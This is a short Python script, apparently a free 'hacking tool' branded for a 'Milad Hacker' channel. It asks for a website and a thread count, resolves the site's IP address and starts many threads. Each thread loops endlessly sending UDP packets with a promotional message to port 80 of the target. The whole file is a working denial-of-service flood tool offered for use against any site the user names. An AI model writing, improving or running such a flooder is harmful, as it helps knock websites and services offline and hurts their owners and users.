import time
import socket
import sys
import _thread
print ("HACKERZARMY-FREE-HACKINGTOOLS-MILADHACKER")
print ("                                 HACKING")
print ("                                FREE")
print ("                              EITAA")
print ("                             MILAD")
print ("                          HACKER")
print ("                         AND")
print ("                       THE")
print ("                     BEST")
print ("                  OTHER")
print ("               HACKERS")
print ("             THE-BEST")
print ("           LEARNS")
print ("          FOR")
print ("      HACKER")
print ("     Z")
print (" ARMY")
print ("HACKERZARMY-FREE-HACKINGTOOLS-MILADHACKER")
site = input("@milad_hacker|Enter URL site => ")
thread_count = input("@milad_hacker|Enter your thread => ")
ip = socket.gethostbyname (site)
UDP_PORT = 80
MESSAGE = 'join milad hacker eitaa'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent $ DDOS OK | @milad_hacker")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
